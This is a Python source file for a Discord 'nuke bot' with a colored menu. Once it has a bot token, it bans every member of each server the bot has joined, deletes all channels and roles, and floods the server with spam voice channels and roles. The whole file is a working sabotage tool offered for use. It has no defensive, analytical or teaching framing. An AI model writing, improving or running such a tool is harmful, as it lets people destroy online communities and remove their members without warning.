import discord
from discord.ext import commands
from colorama import init, Fore as cc
from os import name as os_name, system
from sys import exit
import asyncio

# Initialize colors
init()
r = cc.LIGHTRED_EX; m = cc.LIGHTMAGENTA_EX; g = cc.LIGHTGREEN_EX; b = cc.LIGHTBLUE_EX; y = cc.LIGHTYELLOW_EX; C = cc.LIGHTCYAN_EX; W = cc.RESET

# Clear screen function
clear = lambda: system('cls') if os_name == 'nt' else system('clear')

def _input(text):
    print(text, end='')
    return input()

baner = f'''{r} _   _       _       {m} ____        _   
{r}| \ | |_   _| | _____{m}| __ )  ___ | |_ 
{r}|  \| | | | | |/ / _ {m}\  _ \ / _ \| __|
{r}| |\  | |_| |   <  __{m}/ |_) | (_) | |_ 
{r}|_| \_|\__,_|_|\_\___{m}|____/ \___/ \__|
{y}Made by: {g}https://github.com/Sigma-cc
''' 

async def delete_all_channels(guild):
    tasks = [c.delete() for c in guild.channels]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    return sum(1 for r in results if not isinstance(r, Exception))

async def delete_all_roles(guild):
    tasks = [r.delete() for r in guild.roles if r.name != "@everyone"]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    return sum(1 for r in results if not isinstance(r, Exception))

async def ban_all_members(guild):
    tasks = [guild.ban(member, reason=None) for member in guild.members if member != guild.me]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    return sum(1 for r in results if not isinstance(r, Exception))

async def create_roles(guild, name, limit=100):
    tasks = [guild.create_role(name=name) for _ in range(min(limit, 200 - len(guild.roles)))]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    return sum(1 for r in results if not isinstance(r, Exception))

async def create_voice_channels(guild, name, limit=100):
    tasks = [guild.create_voice_channel(name=name) for _ in range(min(limit, 200 - len(guild.channels)))]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    return sum(1 for r in results if not isinstance(r, Exception))

async def nuke_guild(guild, name):
    print(f"{r}>> Nuking: {m}{guild.name}{W}")
    # Run destructive tasks concurrently
    ban_task = ban_all_members(guild)
    del_chan_task = delete_all_channels(guild)
    del_role_task = delete_all_roles(guild)

    banned, channels_deleted, roles_deleted = await asyncio.gather(
        ban_task, del_chan_task, del_role_task
    )
    print(f"{m}Banned: {b}{banned}{W}")
    print(f"{m}Channels deleted: {b}{channels_deleted}{W}")
    print(f"{m}Roles deleted: {b}{roles_deleted}{W}")

    # Create new resources concurrently
    create_voice = create_voice_channels(guild, name)
    create_role = create_roles(guild, name)
    voice_created, roles_created = await asyncio.gather(create_voice, create_role)
    print(f"{m}Voice channels created: {b}{voice_created}{W}")
    print(f"{m}Roles created: {b}{roles_created}{W}")
    print(f"{r}{'-'*40}{W}\n")

# Main CLI
while True:
    clear()
    choice = _input(f"{baner}\n{C}1){g} Run Nuke Bot  {C}2){g} Exit\n{y}Choice: {g}")
    if choice == '1':
        token = _input(f"{y}Bot token: {g}")
        name = _input(f"{y}Name for new channels/roles: {g}")

        client = commands.Bot(command_prefix='.', intents=discord.Intents.all())

        @client.event
        async def on_ready():
            print(f"\n[+] Logged in as {client.user} in {len(client.guilds)} guilds")
            tasks = []
            for guild in client.guilds:
                tasks.append(nuke_guild(guild, name))
            # Execute nukes sequentially to respect rate limits
            for t in tasks:
                await t
            await client.close()

        try:
            client.run(token)
        except Exception as e:
            print(f"{r}Error: {e}{W}")
            input("Press Enter to return...")
    elif choice == '2':
        print(f"{r}Goodbye!{W}")
        exit()
